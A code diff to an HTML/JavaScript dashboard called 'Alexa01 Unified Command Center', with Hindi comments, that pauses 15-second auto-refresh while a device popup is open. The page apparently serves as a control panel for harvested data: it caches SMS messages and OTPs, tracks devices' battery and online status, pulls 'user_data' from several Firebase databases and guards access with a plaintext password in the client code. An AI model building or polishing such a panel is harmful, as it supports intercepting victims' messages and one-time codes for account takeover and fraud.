@@ -149,7 +149,7 @@ body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;b
     <div class="head-l"><div class="logo">AA</div><div><h1>Alexa01</h1><div class="tag">Unified Command Center</div></div></div>
     <div class="head-r">
       <span class="h-info" id="hInfo">--</span>
-      <button class="h-btn prim" onclick="loadAll()">⟳ Sync</button>
+      <button class="h-btn prim" onclick="loadAll(true)">⟳ Sync</button>
       <button class="h-btn" onclick="logout()">Logout</button>
     </div>
   </div>
@@ -224,6 +224,7 @@ const DBS = {
 const PASS = "Alexa";
 let DEV = {}, DLIST = [], FILTER = 'all', SMS_CACHE = [], OTP_CACHE = [];
 let polling = null;
+let isModalOpen = false; // ट्रैक करने के लिए कि पॉपअप खुला है या नहीं
 
 function esc(s){return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;')}
 function show(m){var t=document.getElementById('toast');t.textContent=m;t.style.display='block';clearTimeout(t._t);t._t=setTimeout(function(){t.style.display='none'},2000)}
@@ -232,16 +233,22 @@ function parseTime(t){if(!t)return 0;if(typeof t==='number')return t;var d=new D
 
 function doLogin(){
   var p=document.getElementById('loginP').value;
-  if(p===PASS){document.getElementById('loginScr').style.display='none';document.getElementById('mainScr').style.display='block';loadAll()}
+  if(p===PASS){document.getElementById('loginScr').style.display='none';document.getElementById('mainScr').style.display='block';loadAll(true)}
   else{document.getElementById('loginE').textContent='Access Denied';document.getElementById('loginE').style.display='block'}
 }
 document.getElementById('loginP').addEventListener('keydown',function(e){if(e.key==='Enter')doLogin()});
 
 function logout(){document.getElementById('mainScr').style.display='none';document.getElementById('loginScr').style.display='flex';document.getElementById('loginP').value='';if(polling)clearInterval(polling)}
 
-function loadAll(){
-  document.getElementById('hInfo').textContent='Loading...';
-  document.getElementById('dGrid').innerHTML='<div class="load"><div class="sp"></div></div>';
+// showLoader पैरामीटर यह तय करेगा कि स्क्रीन पर लोडिंग स्पिनर दिखाना है या चुपचाप बैकग्राउंड में अपडेट करना है
+function loadAll(showLoader = false){
+  if(isModalOpen) return; // अगर यूजर ने कोई डिवाइस खोल रखा है, तो ऑटो-रिफ्रेश रोकें
+  
+  if(showLoader) {
+    document.getElementById('hInfo').textContent='Loading...';
+    document.getElementById('dGrid').innerHTML='<div class="load"><div class="sp"></div></div>';
+  }
+  
   var names=Object.keys(DBS);
   var proms=names.map(function(n){return fbGet(DBS[n],'user_data').then(function(d){return{name:n,data:d||{}}})});
   Promise.all(proms).then(function(results){
@@ -379,6 +386,7 @@ function switchTab(t,btn){
 }
 
 function openD(id){
+  isModalOpen = true; // पोलिंग रिफ्रेश रोकेगा
   var d=DEV[id];if(!d)return;
   var p=ph(d),st=d.status||'offline',b=parseInt(d.battery||d.battery_level||0)||0;
   var model=d.d_name||d.Device_Name||'Device',info=d.Device_info||'';
@@ -401,6 +409,7 @@ function openD(id){
 }
 
 function closeModal(){
+  isModalOpen = false; // पोलिंग रिफ्रेश दोबारा शुरू करेगा
   document.getElementById('modalOver').classList.remove('open');
   document.body.style.overflow='';
 }
@@ -416,10 +425,12 @@ function fmt(t){
 
 function startPoll(){
   if(polling)clearInterval(polling);
-  polling=setInterval(function(){loadAll()},15000);
+  // बैकग्राउंड पोलिंग बिना लोडर (False) के चलेगी ताकि स्क्रीन बार-बार फ्लैश न हो
+  polling=setInterval(function(){loadAll(false)},15000);
 }
 
-loadAll();
+// शुरूआती लोड फुल लोडर स्पिनर के साथ होगा
+loadAll(true);
 startPoll();
 </script>
 </body>
